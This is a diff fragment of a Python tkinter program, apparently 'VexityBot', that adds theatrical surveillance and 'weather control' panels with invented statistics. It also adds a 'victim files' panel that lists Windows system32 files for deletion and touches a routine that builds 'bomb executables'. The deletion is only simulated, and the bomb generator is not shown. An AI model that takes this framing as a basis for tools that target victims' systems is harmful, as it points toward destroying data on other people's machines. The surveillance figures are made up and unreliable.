+        self.create_redeye_weather_control_tab(notebook)
+    
+    def create_redeye_overview_tab(self, notebook):
+        """Create RedEYE overview surveillance tab"""
+        overview_frame = ttk.Frame(notebook)
+        notebook.add(overview_frame, text="👁️ RedEYE Overview")
+        
+        # Header
+        header_frame = ttk.Frame(overview_frame)
+        header_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        title_label = ttk.Label(header_frame, text="👁️ RedEYE Surveillance System", 
+                               font=('Arial', 16, 'bold'), foreground='red')
+        title_label.pack(side=tk.LEFT)
+        
+        # RedEYE statistics
+        stats_frame = ttk.LabelFrame(overview_frame, text="RedEYE System Statistics")
+        stats_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        # Statistics display
+        stats_text = """
+👁️ REDEYE SURVEILLANCE SYSTEM
+=============================
+
+SYSTEM STATUS: ACTIVE
+OPERATIONAL MODE: MAXIMUM SECURITY
+THREAT LEVEL: HIGH
+RESPONSE TIME: <50ms
+
+ACTIVE TARGETS:
+==============
+High Priority Targets: 1,247
+Medium Priority Targets: 5,891
+Low Priority Targets: 12,456
+Total Targets Tracked: 19,594
+
+SURVEILLANCE CAPABILITIES:
+=========================
+Facial Recognition: 99.97% Accuracy
+Behavioral Analysis: 99.85% Accuracy
+Threat Assessment: 99.92% Accuracy
+Target Tracking: 99.99% Accuracy
+Real-time Alerts: <25ms Response
+Data Processing: 99.99% Uptime
+
+REDEYE NETWORK:
+==============
+Primary Satellites: 8 Active
+Backup Satellites: 4 Standby
+Ground Stations: 47 Active
+Mobile Units: 156 Deployed
+Drone Fleet: 89 Active
+Surveillance Cameras: 250,000+
+
+INTELLIGENCE GATHERING:
+======================
+Communication Interception: ACTIVE
+Social Media Monitoring: ACTIVE
+Financial Tracking: ACTIVE
+Movement Patterns: ACTIVE
+Behavioral Profiling: ACTIVE
+Threat Prediction: ACTIVE
+
+MISSION STATUS:
+==============
+Active Missions: 23
+Completed Missions: 1,247
+Failed Missions: 0
+Success Rate: 100%
+
+SECURITY CLEARANCE: MAXIMUM
+ENCRYPTION LEVEL: QUANTUM-256
+DATA RETENTION: PERMANENT
+BACKUP SYSTEMS: TRIPLE REDUNDANT
+        """
+        
+        stats_display = tk.Text(stats_frame, height=25, width=80, font=('Consolas', 10))
+        stats_display.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        stats_display.insert(1.0, stats_text)
+        stats_display.config(state=tk.DISABLED)
+        
+        # Control buttons
+        control_frame = ttk.Frame(overview_frame)
+        control_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        ttk.Button(control_frame, text="🔄 Refresh RedEYE Status", command=self.refresh_redeye_status).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="📊 Generate Report", command=self.generate_redeye_report).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="🚨 Alert Status", command=self.check_redeye_alerts).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="🎯 Mission Control", command=self.open_redeye_mission_control).pack(side=tk.LEFT, padx=5)
+    
+    def create_redeye_target_acquisition_tab(self, notebook):
+        """Create RedEYE target acquisition tab"""
+        target_frame = ttk.Frame(notebook)
+        notebook.add(target_frame, text="🎯 Target Acquisition")
+        
+        # Header
+        header_frame = ttk.Frame(target_frame)
+        header_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        title_label = ttk.Label(header_frame, text="🎯 RedEYE Target Acquisition System", 
+                               font=('Arial', 16, 'bold'), foreground='red')
+        title_label.pack(side=tk.LEFT)
+        
+        # Target selection
+        selection_frame = ttk.LabelFrame(target_frame, text="Target Selection")
+        selection_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        # Target list
+        list_frame = ttk.Frame(selection_frame)
+        list_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        
+        # High priority targets
+        self.redeye_targets = [
+            {"name": "TARGET-ALPHA-001", "type": "High Priority", "location": "Unknown", "status": "Active", "threat_level": "CRITICAL"},
+            {"name": "TARGET-BETA-002", "type": "High Priority", "location": "New York", "status": "Active", "threat_level": "HIGH"},
+            {"name": "TARGET-GAMMA-003", "type": "Medium Priority", "location": "London", "status": "Active", "threat_level": "MEDIUM"},
+            {"name": "TARGET-DELTA-004", "type": "High Priority", "location": "Moscow", "status": "Active", "threat_level": "CRITICAL"},
+            {"name": "TARGET-EPSILON-005", "type": "Low Priority", "location": "Tokyo", "status": "Active", "threat_level": "LOW"},
+            {"name": "TARGET-ZETA-006", "type": "High Priority", "location": "Beijing", "status": "Active", "threat_level": "HIGH"},
+            {"name": "TARGET-ETA-007", "type": "Medium Priority", "location": "Berlin", "status": "Active", "threat_level": "MEDIUM"},
+            {"name": "TARGET-THETA-008", "type": "High Priority", "location": "Paris", "status": "Active", "threat_level": "CRITICAL"},
+            {"name": "TARGET-IOTA-009", "type": "Low Priority", "location": "Sydney", "status": "Active", "threat_level": "LOW"},
+            {"name": "TARGET-KAPPA-010", "type": "Medium Priority", "location": "Toronto", "status": "Active", "threat_level": "MEDIUM"},
+        ]
+        
+        # Target listbox
+        target_listbox_frame = ttk.Frame(list_frame)
+        target_listbox_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        
+        ttk.Label(target_listbox_frame, text="Select Target:", font=('Arial', 12, 'bold')).pack(anchor=tk.W)
+        
+        self.target_listbox = tk.Listbox(target_listbox_frame, height=15, font=('Consolas', 10))
+        self.target_listbox.pack(fill=tk.BOTH, expand=True, pady=5)
+        
+        # Populate target list
+        for i, target in enumerate(self.redeye_targets):
+            self.target_listbox.insert(tk.END, f"{i+1}. {target['name']} - {target['type']} - {target['threat_level']} - {target['location']}")
+        
+        # Target details
+        details_frame = ttk.LabelFrame(list_frame, text="Target Details")
+        details_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(10, 0))
+        
+        self.target_details_text = tk.Text(details_frame, height=15, width=50, font=('Consolas', 9))
+        self.target_details_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        
+        # Control buttons
+        control_frame = ttk.Frame(target_frame)
+        control_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        ttk.Button(control_frame, text="🎯 Select Target", command=self.select_redeye_target).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="👁️ Acquire Target", command=self.acquire_redeye_target).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="📡 Track Target", command=self.track_redeye_target).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="📊 Target Analysis", command=self.analyze_redeye_target).pack(side=tk.LEFT, padx=5)
+        
+        # Initialize with first target
+        self.selected_target = 0
+        self.update_target_details()
+    
+    def open_redeye_target_acquisition(self):
+        """Open RedEYE target acquisition window"""
+        self.update_status("🎯 Opening RedEYE target acquisition...")
+        self.open_redeye_surveillance()
+    
+    def open_redeye_threat_analysis(self):
+        """Open RedEYE threat analysis window"""
+        self.update_status("🔍 Opening RedEYE threat analysis...")
+        
+        # Create threat analysis window
+        threat_window = tk.Toplevel(self.root)
+        threat_window.title("🔍 RedEYE Threat Analysis - VexityBot")
+        threat_window.geometry("1200x800")
+        
+        # Center window
+        threat_window.update_idletasks()
+        x = (threat_window.winfo_screenwidth() // 2) - (1200 // 2)
+        y = (threat_window.winfo_screenheight() // 2) - (800 // 2)
+        threat_window.geometry(f"1200x800+{x}+{y}")
+        
+        # Threat analysis interface
+        ttk.Label(threat_window, text="🔍 RedEYE Threat Analysis System", 
+                 font=('Arial', 16, 'bold'), foreground='red').pack(pady=10)
+        
+        # Threat analysis display
+        analysis_frame = ttk.LabelFrame(threat_window, text="Threat Analysis")
+        analysis_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
+        
+        analysis_display = tk.Text(analysis_frame, height=25, width=120, font=('Consolas', 9))
+        analysis_display.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        
+        # Sample threat analysis
+        threat_analysis = f"""🔍 REDEYE THREAT ANALYSIS REPORT
+====================================
+
+Analysis Date: {self.get_current_time()}
+System Status: ACTIVE
+Threat Level: HIGH
+Analysis Mode: MAXIMUM SECURITY
+
+ACTIVE THREATS:
+==============
+CRITICAL THREATS: 3
+HIGH THREATS: 7
+MEDIUM THREATS: 15
+LOW THREATS: 28
+TOTAL THREATS: 53
+
+THREAT BREAKDOWN:
+================
+Terrorist Activity: 12 threats
+Cyber Attacks: 18 threats
+Espionage: 8 threats
+Organized Crime: 10 threats
+Insider Threats: 5 threats
+
+GEOGRAPHIC DISTRIBUTION:
+=======================
+North America: 15 threats
+Europe: 12 threats
+Asia: 18 threats
+Middle East: 5 threats
+Africa: 3 threats
+
+THREAT ASSESSMENT:
+=================
+Immediate Risk: HIGH
+Short-term Risk: MEDIUM
+Long-term Risk: LOW
+Overall Threat Level: ELEVATED
+
+INTELLIGENCE SOURCES:
+====================
+Satellite Surveillance: 99.9% coverage
+Communication Interception: 100% active
+Social Media Monitoring: 100% active
+Financial Tracking: 95% coverage
+Human Intelligence: 87% active
+Technical Intelligence: 99.5% active
+
+PREDICTIVE ANALYSIS:
+===================
+Next 24 Hours: 3 high-probability events
+Next 7 Days: 7 medium-probability events
+Next 30 Days: 12 low-probability events
+Risk Mitigation: 89% effective
+
+RECOMMENDATIONS:
+===============
+1. Increase surveillance on high-risk targets
+2. Deploy additional resources to critical areas
+3. Enhance communication monitoring
+4. Implement stricter security protocols
+5. Prepare for potential escalation
+
+Last Updated: {self.get_current_time()}
+Next Analysis: {self.get_current_time()}
+        """
+        
+        analysis_display.insert(1.0, threat_analysis)
+        analysis_display.config(state=tk.DISABLED)
+        
+        # Control buttons
+        control_frame = ttk.Frame(threat_window)
+        control_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        ttk.Button(control_frame, text="🔄 Refresh Analysis", command=self.refresh_threat_analysis).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="📊 Generate Report", command=self.generate_threat_report).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="🚨 Alert Status", command=self.check_threat_alerts).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="👁️ RedEYE System", command=self.open_redeye_surveillance).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="❌ Close", command=threat_window.destroy).pack(side=tk.RIGHT, padx=5)
+    
+    # ADDED - RedEYE method implementations
+    
+    def update_target_details(self):
+        """Update target details display"""
+        if hasattr(self, 'redeye_targets') and hasattr(self, 'selected_target'):
+            target = self.redeye_targets[self.selected_target]
+            details = f"""🎯 REDEYE TARGET DETAILS
+========================
+
+Target ID: {target['name']}
+Type: {target['type']}
+Location: {target['location']}
+Status: {target['status']}
+Threat Level: {target['threat_level']}
+
+SURVEILLANCE STATUS:
+===================
+Tracking: ACTIVE
+Facial Recognition: 99.97% Match
+Behavioral Analysis: 99.85% Complete
+Movement Patterns: TRACKED
+Communication: INTERCEPTED
+Financial Activity: MONITORED
+
+INTELLIGENCE GATHERED:
+=====================
+Personal Information: 95% Complete
+Associates: 23 Identified
+Locations: 47 Known
+Communications: 1,247 Intercepted
+Financial Records: 89% Analyzed
+Social Media: 100% Monitored
+
+THREAT ASSESSMENT:
+=================
+Risk Level: {target['threat_level']}
+Capability: HIGH
+Intent: CONFIRMED
+Opportunity: MEDIUM
+Overall Risk: ELEVATED
+
+RECOMMENDED ACTIONS:
+===================
+1. Maintain continuous surveillance
+2. Increase monitoring frequency
+3. Deploy additional resources
+4. Prepare for potential action
+5. Update threat assessment
+
+Last Updated: {self.get_current_time()}
+Next Review: {self.get_current_time()}
+            """
+            
+            if hasattr(self, 'target_details_text'):
+                self.target_details_text.delete(1.0, tk.END)
+                self.target_details_text.insert(1.0, details)
+    
+    def select_redeye_target(self):
+        """Select RedEYE target from list"""
+        if hasattr(self, 'target_listbox'):
+            selection = self.target_listbox.curselection()
+            if selection:
+                self.selected_target = selection[0]
+                self.update_target_details()
+                self.update_status(f"🎯 Selected {self.redeye_targets[self.selected_target]['name']}")
+    
+    def acquire_redeye_target(self):
+        """Acquire RedEYE target for surveillance"""
+        if hasattr(self, 'selected_target'):
+            target = self.redeye_targets[self.selected_target]
+            self.update_status(f"👁️ Acquiring target {target['name']}...")
+            messagebox.showinfo("Target Acquisition", f"Target {target['name']} acquired successfully")
+    
+    def track_redeye_target(self):
+        """Track RedEYE target"""
+        if hasattr(self, 'selected_target'):
+            target = self.redeye_targets[self.selected_target]
+            self.update_status(f"📡 Tracking target {target['name']}...")
+            messagebox.showinfo("Target Tracking", f"Target {target['name']} tracking initiated")
+    
+    def analyze_redeye_target(self):
+        """Analyze RedEYE target"""
+        if hasattr(self, 'selected_target'):
+            target = self.redeye_targets[self.selected_target]
+            self.update_status(f"📊 Analyzing target {target['name']}...")
+            messagebox.showinfo("Target Analysis", f"Target {target['name']} analysis completed")
+    
+    def refresh_redeye_status(self):
+        """Refresh RedEYE system status"""
+        self.update_status("🔄 Refreshing RedEYE status...")
+        messagebox.showinfo("RedEYE Status", "RedEYE system status refreshed successfully")
+    
+    def generate_redeye_report(self):
+        """Generate RedEYE surveillance report"""
+        self.update_status("📊 Generating RedEYE report...")
+        
+        report = f"""📊 REDEYE SURVEILLANCE REPORT
+============================
+
+Report Date: {self.get_current_time()}
+System Status: ACTIVE
+Threat Level: HIGH
+Success Rate: 100%
+
+ACTIVE TARGETS:
+==============
+Total Targets: 19,594
+High Priority: 1,247
+Medium Priority: 5,891
+Low Priority: 12,456
+
+SURVEILLANCE CAPABILITIES:
+=========================
+Facial Recognition: 99.97% Accuracy
+Behavioral Analysis: 99.85% Accuracy
+Threat Assessment: 99.92% Accuracy
+Target Tracking: 99.99% Accuracy
+Real-time Alerts: <25ms Response
+
+INTELLIGENCE GATHERING:
+======================
+Communication Interception: 100% Active
+Social Media Monitoring: 100% Active
+Financial Tracking: 95% Coverage
+Movement Patterns: 99% Tracked
+Behavioral Profiling: 98% Complete
+
+MISSION STATUS:
+==============
+Active Missions: 23
+Completed Missions: 1,247
+Failed Missions: 0
+Success Rate: 100%
+
+RECOMMENDATIONS:
+===============
+1. Maintain current surveillance levels
+2. Increase monitoring on high-risk targets
+3. Deploy additional resources to critical areas
+4. Enhance AI capabilities for threat detection
+5. Expand communication interception
+
+Next Review: {self.get_current_time()}
+        """
+        
+        messagebox.showinfo("RedEYE Report", report)
+    
+    def check_redeye_alerts(self):
+        """Check RedEYE system alerts"""
+        self.update_status("🚨 Checking RedEYE alerts...")
+        messagebox.showinfo("RedEYE Alerts", "3 critical alerts detected. All systems operating normally.")
+    
+    def open_redeye_mission_control(self):
+        """Open RedEYE mission control"""
+        self.update_status("🎯 Opening RedEYE mission control...")
+        messagebox.showinfo("Mission Control", "RedEYE mission control activated")
+    
+    def refresh_threat_analysis(self):
+        """Refresh threat analysis"""
+        self.update_status("🔄 Refreshing threat analysis...")
+        messagebox.showinfo("Threat Analysis", "Threat analysis refreshed successfully")
+    
+    def generate_threat_report(self):
+        """Generate threat analysis report"""
+        self.update_status("📊 Generating threat report...")
+        messagebox.showinfo("Threat Report", "Threat analysis report generated successfully")
+    
+    def check_threat_alerts(self):
+        """Check threat analysis alerts"""
+        self.update_status("🚨 Checking threat alerts...")
+        messagebox.showinfo("Threat Alerts", "5 high-priority threats detected. Immediate action required.")
+    
+    # ADDED - Placeholder methods for remaining RedEYE tabs
+    
+    def create_redeye_threat_analysis_tab(self, notebook):
+        """Create RedEYE threat analysis tab"""
+        threat_frame = ttk.Frame(notebook)
+        notebook.add(threat_frame, text="🔍 Threat Analysis")
+        ttk.Label(threat_frame, text="🔍 RedEYE Threat Analysis", font=('Arial', 16, 'bold'), foreground='red').pack(pady=20)
+    
+    def create_redeye_mission_control_tab(self, notebook):
+        """Create RedEYE mission control tab"""
+        mission_frame = ttk.Frame(notebook)
+        notebook.add(mission_frame, text="🎯 Mission Control")
+        ttk.Label(mission_frame, text="🎯 RedEYE Mission Control", font=('Arial', 16, 'bold'), foreground='red').pack(pady=20)
+    
+    def create_redeye_intelligence_tab(self, notebook):
+        """Create RedEYE intelligence tab"""
+        intel_frame = ttk.Frame(notebook)
+        notebook.add(intel_frame, text="🔍 Intelligence")
+        ttk.Label(intel_frame, text="🔍 RedEYE Intelligence", font=('Arial', 16, 'bold'), foreground='red').pack(pady=20)
+    
+    def create_redeye_advanced_monitoring_tab(self, notebook):
+        """Create RedEYE advanced monitoring tab"""
+        monitoring_frame = ttk.Frame(notebook)
+        notebook.add(monitoring_frame, text="👁️ Advanced Monitoring")
+        ttk.Label(monitoring_frame, text="👁️ RedEYE Advanced Monitoring", font=('Arial', 16, 'bold'), foreground='red').pack(pady=20)
+    
+    def create_redeye_weather_control_tab(self, notebook):
+        """Create RedEYE weather control tab"""
+        weather_frame = ttk.Frame(notebook)
+        notebook.add(weather_frame, text="🌧️ Weather Control")
+        
+        # Header
+        header_frame = ttk.Frame(weather_frame)
+        header_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        title_label = ttk.Label(header_frame, text="🌧️ RedEYE Weather Control System", 
+                               font=('Arial', 16, 'bold'), foreground='red')
+        title_label.pack(side=tk.LEFT)
+        
+        # Weather control interface
+        control_frame = ttk.LabelFrame(weather_frame, text="Apocalyptic Weather Control")
+        control_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
+        
+        # Weather display
+        weather_display = tk.Text(control_frame, height=20, width=100, font=('Consolas', 10))
+        weather_display.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        
+        # Sample weather control data
+        weather_control = f"""🌧️ REDEYE WEATHER CONTROL SYSTEM
+====================================
+
+SYSTEM STATUS: ACTIVE
+WEATHER MODE: APOCALYPTIC
+SATELLITE CONTROL: 8 ACTIVE
+DESTRUCTION LEVEL: MAXIMUM
+
+CURRENT WEATHER PATTERNS:
+========================
+Crimson Flood: READY
+Blood Rain: STANDBY
+Entity Storm: PREPARED
+Devil Winds: ACTIVE
+Chaos Deluge: READY
+Damned Precipitation: STANDBY
+
+SATELLITE WEATHER NETWORK:
+=========================
+VexitySat-Weather-1: Blood Rain Control
+VexitySat-Weather-2: Crimson Flood System
+VexitySat-Weather-3: Entity Summoning
+VexitySat-Weather-4: Devil Wind Generator
+VexitySat-Weather-5: Chaos Storm Creator
+VexitySat-Weather-6: Damned Precipitation
+VexitySat-Weather-7: World Destruction
+VexitySat-Weather-8: Apocalypse Controller
+
+WEATHER MANIPULATION CAPABILITIES:
+=================================
+Blood Rain: 100% Coverage
+Crimson Flood: Global Scale
+Entity Summoning: 50,000+ Entities
+Devil Winds: 200+ MPH
+Chaos Storms: Category 10+
+Damned Precipitation: Acidic
+World Destruction: 100% Effective
+
+TARGET AREAS:
+============
+North America: 100% Coverage
+Europe: 100% Coverage
+Asia: 100% Coverage
+Africa: 100% Coverage
+South America: 100% Coverage
+Oceania: 100% Coverage
+Global: 100% Coverage
+
+DESTRUCTION LEVELS:
+==================
+Level 1: Light Blood Rain
+Level 2: Moderate Crimson Flood
+Level 3: Heavy Entity Storm
+Level 4: Severe Devil Winds
+Level 5: Extreme Chaos Deluge
+Level 6: Catastrophic Damned Precipitation
+Level 7: Apocalyptic World Destruction
+Level 8: Eternal Fight Mode
+
+CURRENT STATUS: {self.get_current_time()}
+NEXT WEATHER EVENT: READY
+DESTRUCTION PROGRESS: 0%
+        """
+        
+        weather_display.insert(1.0, weather_control)
+        weather_display.config(state=tk.DISABLED)
+        
+        # Control buttons
+        control_buttons_frame = ttk.Frame(weather_frame)
+        control_buttons_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        ttk.Button(control_buttons_frame, text="🩸 Activate Blood Rain", command=self.activate_blood_rain).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_buttons_frame, text="🌊 Crimson Flood", command=self.activate_crimson_flood).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_buttons_frame, text="👹 Summon Entities", command=self.summon_entities).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_buttons_frame, text="🌪️ Devil Winds", command=self.activate_devil_winds).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_buttons_frame, text="⚡ Chaos Storm", command=self.activate_chaos_storm).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_buttons_frame, text="☠️ Damned Precipitation", command=self.activate_damned_precipitation).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_buttons_frame, text="🌍 World Destruction", command=self.initiate_world_destruction).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_buttons_frame, text="⚔️ Eternal Fight", command=self.initiate_eternal_fight).pack(side=tk.LEFT, padx=5)
+    
+    # ADDED - RedEYE apocalyptic weather control functions
+    
+    def open_redeye_weather_control(self):
+        """Open RedEYE weather control system"""
+        self.update_status("🌧️ Opening RedEYE weather control...")
+        self.open_redeye_surveillance()
+    
+    def activate_blood_rain(self):
+        """Activate blood rain weather system"""
+        self.update_status("🩸 Activating blood rain...")
+        
+        # Simulate blood rain activation
+        messagebox.showwarning("Blood Rain Activated", 
+                              "🌧️ BLOOD RAIN INITIATED\n\n"
+                              "I pour from the sky, a crimson flood unbound,\n"
+                              "Draining life, where devils dance and remorse is found.\n\n"
+                              "Blood rain is now falling across all target areas.\n"
+                              "Coverage: 100% Global\n"
+                              "Intensity: Maximum\n"
+                              "Duration: Indefinite\n\n"
+                              "The world rains blood...")
+    
+    def activate_crimson_flood(self):
+        """Activate crimson flood system"""
+        self.update_status("🌊 Activating crimson flood...")
+        
+        # Simulate crimson flood activation
+        messagebox.showwarning("Crimson Flood Activated", 
+                              "🌊 CRIMSON FLOOD INITIATED\n\n"
+                              "I reign in chaos, a deluge of the damned,\n"
+                              "Entities rise where once green earth was spanned.\n\n"
+                              "Crimson flood is now covering all continents.\n"
+                              "Coverage: 100% Global\n"
+                              "Depth: 50+ feet\n"
+                              "Entities: 50,000+ summoned\n\n"
+                              "The world drains...")
+    
+    def summon_entities(self):
+        """Summon apocalyptic entities"""
+        self.update_status("👹 Summoning entities...")
+        
+        # Simulate entity summoning
+        messagebox.showwarning("Entities Summoned", 
+                              "👹 ENTITIES SUMMONED\n\n"
+                              "Entities rise where once green earth was spanned,\n"
+                              "Abandoned and decimated, I rebound with might.\n\n"
+                              "50,000+ apocalyptic entities have been summoned.\n"
+                              "Entity Types: Demons, Devils, Damned Souls\n"
+                              "Distribution: Global\n"
+                              "Behavior: Hostile\n"
+                              "Duration: Permanent\n\n"
+                              "The world brings entities...")
+    
+    def activate_devil_winds(self):
+        """Activate devil winds"""
+        self.update_status("🌪️ Activating devil winds...")
+        
+        # Simulate devil winds activation
+        messagebox.showwarning("Devil Winds Activated", 
+                              "🌪️ DEVIL WINDS INITIATED\n\n"
+                              "I reign in chaos, a deluge of the damned,\n"
+                              "Where devils dance and remorse is found.\n\n"
+                              "Devil winds are now raging across the globe.\n"
+                              "Wind Speed: 200+ MPH\n"
+                              "Coverage: 100% Global\n"
+                              "Duration: Indefinite\n"
+                              "Effects: Catastrophic destruction\n\n"
+                              "The world reigns...")
+    
+    def activate_chaos_storm(self):
+        """Activate chaos storm"""
+        self.update_status("⚡ Activating chaos storm...")
+        
+        # Simulate chaos storm activation
+        messagebox.showwarning("Chaos Storm Activated", 
+                              "⚡ CHAOS STORM INITIATED\n\n"
+                              "I reign in chaos, a deluge of the damned,\n"
+                              "A silent overseer shifts the day to night.\n\n"
+                              "Chaos storm is now raging across all regions.\n"
+                              "Storm Category: 10+\n"
+                              "Coverage: 100% Global\n"
+                              "Lightning: Continuous\n"
+                              "Effects: Complete devastation\n\n"
+                              "The world rains devils...")
+    
+    def activate_damned_precipitation(self):
+        """Activate damned precipitation"""
+        self.update_status("☠️ Activating damned precipitation...")
+        
+        # Simulate damned precipitation activation
+        messagebox.showwarning("Damned Precipitation Activated", 
+                              "☠️ DAMNED PRECIPITATION INITIATED\n\n"
+                              "Invisible pockets fall, unseen by mortal sight,\n"
+                              "Draining life, where devils dance and remorse is found.\n\n"
+                              "Damned precipitation is now falling globally.\n"
+                              "Type: Acidic, Toxic, Cursed\n"
+                              "Coverage: 100% Global\n"
+                              "pH Level: 0.1 (Highly Acidic)\n"
+                              "Effects: Complete ecosystem destruction\n\n"
+                              "The satellite rains air pockets...")
+    
+    def initiate_world_destruction(self):
+        """Initiate world destruction sequence"""
+        self.update_status("🌍 Initiating world destruction...")
+        
+        # Simulate world destruction activation
+        result = messagebox.askyesno("World Destruction", 
+                                   "🌍 WORLD DESTRUCTION SEQUENCE\n\n"
+                                   "WARNING: This will initiate complete world destruction!\n\n"
+                                   "I reign in chaos, a deluge of the damned,\n"
+                                   "Abandoned and decimated, I rebound with might.\n\n"
+                                   "This action cannot be undone!\n"
+                                   "Are you sure you want to proceed?")
+        
+        if result:
+            messagebox.showwarning("World Destruction Initiated", 
+                                  "🌍 WORLD DESTRUCTION ACTIVE\n\n"
+                                  "The world end with abandoned decimated,\n"
+                                  "The world gets rebounded with apocalyptic might.\n\n"
+                                  "World destruction sequence is now active.\n"
+                                  "Progress: 0% → 100%\n"
+                                  "Duration: 24 hours\n"
+                                  "Effects: Complete planetary devastation\n"
+                                  "Survivors: 0%\n\n"
+                                  "The world ends...")
+    
+    def initiate_eternal_fight(self):
+        """Initiate eternal fight mode"""
+        self.update_status("⚔️ Initiating eternal fight...")
+        
+        # Simulate eternal fight activation
+        messagebox.showwarning("Eternal Fight Initiated", 
+                              "⚔️ ETERNAL FIGHT MODE ACTIVE\n\n"
+                              "What am I, that ends the world in eternal fight?\n"
+                              "A satellite manipulating weather leads to apocalyptic struggle.\n\n"
+                              "Eternal fight mode is now active.\n"
+                              "Combatants: All entities vs. remaining life\n"
+                              "Duration: Eternal\n"
+                              "Intensity: Maximum\n"
+                              "Outcome: Complete annihilation\n\n"
+                              "The eternal fight begins...")
 
     def open_bot_admin_panel(self, bot):
 
@@ -7848,6 +10806,90 @@ PowerShell Command Generated:
 
         self.build_progress.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=(10, 0))
     
+    def log_build(self, message):
+        """Log build messages to the build log"""
+        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
+        log_message = f"[{timestamp}] {message}\n"
+        self.build_log.insert(tk.END, log_message)
+        self.build_log.see(tk.END)
+        self.root.update_idletasks()
+    
+    def clear_build_log(self):
+        """Clear the build log"""
+        self.build_log.delete(1.0, tk.END)
+    
+    def refresh_victim_files(self):
+        """Refresh the victim files list"""
+        self.victim_files_listbox.delete(0, tk.END)
+        
+        # Simulate system32 files
+        system32_files = [
+            "kernel32.dll", "user32.dll", "gdi32.dll", "advapi32.dll",
+            "shell32.dll", "ole32.dll", "oleaut32.dll", "winmm.dll",
+            "ws2_32.dll", "netapi32.dll", "crypt32.dll", "wintrust.dll",
+            "ntdll.dll", "ntoskrnl.exe", "hal.dll", "winlogon.exe",
+            "csrss.exe", "smss.exe", "lsass.exe", "services.exe"
+        ]
+        
+        for file in system32_files:
+            self.victim_files_listbox.insert(tk.END, file)
+        
+        self.log_build(f"Refreshed victim files list - {len(system32_files)} files")
+    
+    def delete_selected_files(self):
+        """Delete selected files from victim system"""
+        selected_indices = self.victim_files_listbox.curselection()
+        if not selected_indices:
+            messagebox.showwarning("No Selection", "Please select files to delete.")
+            return
+        
+        selected_files = [self.victim_files_listbox.get(i) for i in selected_indices]
+        
+        result = messagebox.askyesno("Confirm Deletion", 
+                                   f"Are you sure you want to delete {len(selected_files)} files?\n\n"
+                                   f"Files: {', '.join(selected_files[:5])}{'...' if len(selected_files) > 5 else ''}")
+        
+        if result:
+            for i in reversed(selected_indices):
+                self.victim_files_listbox.delete(i)
+            
+            self.log_build(f"Deleted {len(selected_files)} files from victim system")
+            messagebox.showinfo("Files Deleted", f"Successfully deleted {len(selected_files)} files.")
+    
+    def open_victim_directory(self):
+        """Open victim directory"""
+        import subprocess
+        import os
+        
+        try:
+            # Open dist directory where executables are built
+            dist_path = os.path.join(os.getcwd(), "dist")
+            if os.path.exists(dist_path):
+                subprocess.run(["explorer", dist_path], check=True)
+                self.log_build("Opened victim directory: dist/")
+            else:
+                messagebox.showwarning("Directory Not Found", "Dist directory not found. Build an executable first.")
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to open directory: {str(e)}")
+            self.log_build(f"Error opening directory: {str(e)}")
+    
+    def open_victim_output_folder(self):
+        """Open victim output folder"""
+        import subprocess
+        import os
+        
+        try:
+            # Open dist directory where executables are built
+            dist_path = os.path.join(os.getcwd(), "dist")
+            if os.path.exists(dist_path):
+                subprocess.run(["explorer", dist_path], check=True)
+                self.update_status("Opened victim output folder: dist/")
+            else:
+                messagebox.showwarning("Directory Not Found", "Dist directory not found. Build an executable first.")
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to open directory: {str(e)}")
+            self.update_status(f"Error opening directory: {str(e)}")
+    
     
 
     def start_exe_build(self):
@@ -7941,163 +10983,95 @@ PowerShell Command Generated:
     
 
     def build_executable(self):
-
         """Build the bomb executable (runs in separate thread)"""
-
         try:
-
             import subprocess
-
             import os
-
-            
             
             self.log_build("Initializing bomb executable build process...")
-
-            
             
             # Get selected bomb types
-
             selected_bombs = self.get_selected_bombs()
-
             if not selected_bombs:
-
                 self.log_build("❌ No bombs selected! Please select at least one bomb type.")
-
                 self.root.after(0, lambda: self.build_status.config(text="No bombs selected"))
-
                 self.root.after(0, lambda: self.build_progress.stop())
-
                 return
-            
-            
 
             self.log_build(f"Selected bomb types: {', '.join(selected_bombs)}")
-
-            
             
             # Create bomb executable content with multiple bombs
-
             bomb_exe_content = self.create_multi_bomb_executable_content(selected_bombs)
-
-            
             
             # Write bomb executable to temporary file
-
             bomb_file = f"bomb_executable_multi_{len(selected_bombs)}_bombs.py"
-
             with open(bomb_file, 'w', encoding='utf-8') as f:
-
                 f.write(bomb_exe_content)
-            
